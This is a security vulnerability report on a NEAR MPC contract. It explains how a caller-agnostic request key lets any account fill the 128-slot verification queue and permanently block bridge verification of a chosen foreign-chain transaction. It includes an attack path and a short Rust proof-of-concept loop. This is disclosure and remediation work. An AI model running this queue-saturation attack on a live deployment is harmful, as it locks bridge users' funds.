### Title
Unprivileged Caller Can Saturate the `verify_foreign_transaction` Fan-Out Queue to Permanently Block Foreign-Chain Bridge Verification - (File: `crates/contract/src/pending_requests.rs`)

---

### Summary

The `verify_foreign_transaction` endpoint uses a **caller-agnostic** request key (`VerifyForeignTransactionRequest` contains no caller identity). Any unprivileged NEAR account can submit 128 identical `verify_foreign_transaction` calls for a specific foreign-chain transaction (e.g., a Bitcoin or Ethereum tx_id), saturating the bounded fan-out queue (`MAX_PENDING_REQUEST_FAN_OUT = 128`) at a cost of 128 yoctonear. Once saturated, every subsequent submission by the legitimate bridge service or user is rejected with `PendingRequestQueueFull`. The attacker can continuously refill the queue as it drains via timeouts, permanently preventing a specific foreign transaction from ever being verified on-chain.

---

### Finding Description

The `verify_foreign_transaction` function in `crates/contract/src/lib.rs` converts the user-supplied `VerifyForeignTransactionRequestArgs` into a `VerifyForeignTransactionRequest` and enqueues a yield-resume promise under that struct as the map key:

```rust
// crates/contract/src/lib.rs:549-555
let request = args_into_verify_foreign_tx_request(request);
let callback_args = serde_json::to_vec(&(&request,)).unwrap();
self.enqueue_yield_request(
    method_names::RETURN_VERIFY_FOREIGN_TX_AND_CLEAN_STATE_ON_SUCCESS,
    callback_args,
    callback_gas,
    move |this, id| this.add_verify_foreign_tx_request(request, id),
);
```

The `VerifyForeignTransactionRequest` struct contains only `request: ForeignChainRpcRequest`, `domain_id: DomainId`, and `payload_version: ForeignTxPayloadVersion` — **no caller account ID or caller-derived tweak**:

```rust
// crates/near-mpc-contract-interface/src/types/foreign_chain.rs:124-128
pub struct VerifyForeignTransactionRequest {
    pub request: ForeignChainRpcRequest,
    pub domain_id: DomainId,
    pub payload_version: ForeignTxPayloadVersion,
}
```

This is in direct contrast to `SignatureRequest`, whose map key includes a `tweak` derived from `(predecessor_id, path)`, making it caller-specific and immune to this attack.

The fan-out queue in `push_pending_yield` is hard-capped at `MAX_PENDING_REQUEST_FAN_OUT = 128`:

```rust
// crates/contract/src/pending_requests.rs:37,51-57
pub const MAX_PENDING_REQUEST_FAN_OUT: u8 = 128;
// ...
if queue.len() >= usize::from(MAX_PENDING_REQUEST_FAN_OUT) {
    env::panic_str(
        &RequestError::PendingRequestQueueFull {
            limit: MAX_PENDING_REQUEST_FAN_OUT,
        }
        .to_string(),
    );
}
```

The contract's own test acknowledges the caller-agnostic nature of the key and that a different account is "blocked from receiving a response by alice's submission":

```rust
// crates/contract/src/lib.rs:3242-3243
// And: caller bob submits the identical request — a different account would today
// be blocked from receiving a response by alice's submission.
```

**Attack path:**
1. Attacker observes a pending or anticipated `verify_foreign_transaction` call for a specific `tx_id` (e.g., a Bitcoin deposit into the Omnibridge).
2. Attacker submits 128 identical `verify_foreign_transaction` calls with the same `(tx_id, domain_id, payload_version)`, each with 1 yoctonear deposit. Total cost: 128 yoctonear (~$0.000000000000001).
3. The queue for that request key is now full.
4. The legitimate bridge service's submission is rejected with `PendingRequestQueueFull`.
5. The 128 attacker yields time out after ~200 NEAR blocks (~4 minutes). The attacker immediately refills the queue.
6. The specific foreign transaction can never be verified on-chain.

---

### Impact Explanation

This breaks the **request-lifecycle invariant** of the foreign-chain bridge flow: a confirmed foreign-chain deposit (Bitcoin, Ethereum, Starknet, Solana) that has been submitted for verification can be permanently prevented from receiving an MPC attestation. For bridge protocols (e.g., Omnibridge inbound flow) that depend on `verify_foreign_transaction` to credit a NEAR-side deposit, this means:

- The user's foreign-chain funds are locked in the bridge contract with no path to redemption.
- If the bridge contract on the foreign chain has a claim window or expiry, the user suffers permanent loss of funds.
- The attacker's cost to sustain the attack indefinitely is ~128 yoctonear per ~4-minute timeout window — effectively zero.

This matches the allowed Medium impact: **"Balance, request-lifecycle, participant-state, or contract execution-flow manipulation that breaks production safety/accounting invariants."**

---

### Likelihood Explanation

- **Entry path is fully unprivileged**: any NEAR account with 1 yoctonear can call `verify_foreign_transaction`.
- **No special knowledge required**: the attacker only needs to know the `tx_id` of the foreign transaction being bridged, which is public on the foreign chain.
- **Cost is negligible**: 128 yoctonear per refill cycle.
- **Targeting is precise**: the attacker can selectively block a single victim's transaction without affecting others.
- **Sustained attack is trivial**: a simple script refilling the queue every ~4 minutes suffices.

---

### Recommendation

1. **Include the caller's account ID in the `VerifyForeignTransactionRequest` key**, analogous to how `SignatureRequest` includes a caller-derived `tweak`. This makes each caller's queue slot independent, preventing cross-caller queue saturation.

2. **Alternatively, enforce a per-caller submission limit** within the fan-out queue: track how many slots each `predecessor_account_id` occupies and reject submissions that would exceed a per-caller cap (e.g., 1–2 slots).

3. **Increase the deposit requirement** for `verify_foreign_transaction` to make queue-saturation attacks economically infeasible.

---

### Proof of Concept

```rust
// Attacker fills the queue for a specific Bitcoin tx_id
let attacker_account = /* any NEAR account */;
let target_tx_id = [7u8; 32]; // observed from the foreign chain mempool/explorer

let request_args = VerifyForeignTransactionRequestArgs {
    domain_id: DomainId(0),
    payload_version: ForeignTxPayloadVersion::V1,
    request: ForeignChainRpcRequest::Bitcoin(BitcoinRpcRequest {
        tx_id: target_tx_id.into(),
        confirmations: 2.into(),
        extractors: vec![BitcoinExtractor::BlockHash],
    }),
};

// Submit 128 times from attacker account — cost: 128 yoctonear total
for _ in 0..128 {
    contract
        .call(method_names::VERIFY_FOREIGN_TRANSACTION)
        .args_json(json!({ "request": request_args }))
        .deposit(NearToken::from_yoctonear(1))
        .max_gas()
        .transact()
        .await?;
}

// Now the legitimate bridge service's submission is rejected:
let result = bridge_service
    .call(contract.id(), method_names::VERIFY_FOREIGN_TRANSACTION)
    .args_json(json!({ "request": request_args }))
    .deposit(NearToken::from_yoctonear(1))
    .max_gas()
    .transact()
    .await?;

// result contains: "Pending-request queue is full for this request key (limit: 128)"
assert!(result.into_result().unwrap_err().to_string()
    .contains("Pending-request queue is full"));
```

**Supporting code references:** [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** crates/near-mpc-contract-interface/src/types/foreign_chain.rs (L124-128)
```rust
pub struct VerifyForeignTransactionRequest {
    pub request: ForeignChainRpcRequest,
    pub domain_id: DomainId,
    pub payload_version: ForeignTxPayloadVersion,
}
```

**File:** crates/contract/src/lib.rs (L549-556)
```rust
        let request = args_into_verify_foreign_tx_request(request);
        let callback_args = serde_json::to_vec(&(&request,)).unwrap();
        self.enqueue_yield_request(
            method_names::RETURN_VERIFY_FOREIGN_TX_AND_CLEAN_STATE_ON_SUCCESS,
            callback_args,
            callback_gas,
            move |this, id| this.add_verify_foreign_tx_request(request, id),
        );
```

**File:** crates/contract/src/lib.rs (L3242-3253)
```rust
        // And: caller bob submits the identical request — a different account would today
        // be blocked from receiving a response by alice's submission.
        let bob = AccountId::from_str("bob.near").unwrap();
        testing_env!(
            VMContextBuilder::new()
                .signer_account_id(bob.clone())
                .predecessor_account_id(bob)
                .current_account_id(context.current_account_id.clone())
                .attached_deposit(NearToken::from_yoctonear(1))
                .build()
        );
        contract.verify_foreign_transaction(request_args);
```

**File:** crates/contract/src/pending_requests.rs (L37-59)
```rust
pub const MAX_PENDING_REQUEST_FAN_OUT: u8 = 128;

/// Append a yield index to the pending-request fan-out queue for `request`.
///
/// Panics with `RequestError::PendingRequestQueueFull` if the resulting queue would
/// exceed `MAX_PENDING_REQUEST_FAN_OUT`.
pub(crate) fn push_pending_yield<K>(
    requests: &mut LookupMap<K, Vec<YieldIndex>>,
    request: K,
    data_id: CryptoHash,
) where
    K: BorshSerialize + BorshDeserialize + Clone + Ord,
{
    let queue = requests.entry(request).or_default();
    if queue.len() >= usize::from(MAX_PENDING_REQUEST_FAN_OUT) {
        env::panic_str(
            &RequestError::PendingRequestQueueFull {
                limit: MAX_PENDING_REQUEST_FAN_OUT,
            }
            .to_string(),
        );
    }
    queue.push(YieldIndex { data_id });
```

**File:** crates/near-mpc-crypto-types/src/sign.rs (L111-125)
```rust
pub struct SignatureRequest {
    pub tweak: Tweak,
    pub payload: Payload,
    pub domain_id: DomainId,
}

impl SignatureRequest {
    pub fn new(domain: DomainId, payload: Payload, predecessor_id: &AccountId, path: &str) -> Self {
        let tweak = crate::kdf::derive_tweak(predecessor_id, path);
        SignatureRequest {
            domain_id: domain,
            tweak,
            payload,
        }
    }
```
